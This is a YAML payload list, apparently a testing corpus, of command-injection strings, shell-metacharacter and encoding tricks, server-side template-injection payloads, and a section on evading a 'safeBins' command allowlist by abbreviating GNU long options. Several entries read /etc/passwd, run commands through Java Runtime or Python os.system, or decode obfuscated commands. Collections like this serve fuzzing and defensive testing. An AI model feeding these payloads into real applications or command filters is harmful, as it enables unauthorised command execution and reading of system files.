command_injection:
  - "; id"
  - "| id"
  - "&& id"
  - "|| id"
  - "$(id)"
  - "`id`"
  - "\nid"
  - "; whoami"
  - "| whoami"
  - "&& whoami"
  - "$(whoami)"
  - "; cat /etc/passwd"
  - "| cat /etc/passwd"
  - "$({cat,/etc/passwd})"

shell_metachar:
  - "${IFS}"
  - "$'\\x20'"
  - "%0a"
  - "%00"
  - "%0d%0a"
  - "${IFS}id"
  - ";${IFS}id"
  - "{cat,/etc/passwd}"
  - "cat${IFS}/etc/passwd"
  - "c'a't /etc/passwd"
  - "c\"a\"t /etc/passwd"

encoding_bypass:
  - "aWQ="
  - "$(echo${IFS}aWQ=|base64${IFS}-d)"
  - "\\x69\\x64"
  - "$(printf '\\x69\\x64')"
  - "$(echo 6964 | xxd -r -p)"
  - "%2f%65%74%63%2f%70%61%73%73%77%64"

template_injection:
  - "{{7*7}}"
  - "${7*7}"
  - "#{7*7}"
  - "<%= 7*7 %>"
  - "{{config}}"
  - "{{self}}"
  - "${T(java.lang.Runtime).getRuntime().exec('id')}"
  - "{{''.__class__.__mro__[1].__subclasses__()}}"
  - "{{request.application.__globals__.__builtins__}}"
  - "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))"

# safeBins bypass (GNU long-option abbreviation)
safebins_gnu_bypass:
  - "ls --he"
  - "cat --numb"
  - "grep --colo"
  - "curl --out /tmp/exfil"
  - "wget --outp /tmp/data"
  - "tar --extrac"
  - "python3 --comm 'import os; os.system(\"id\")'"
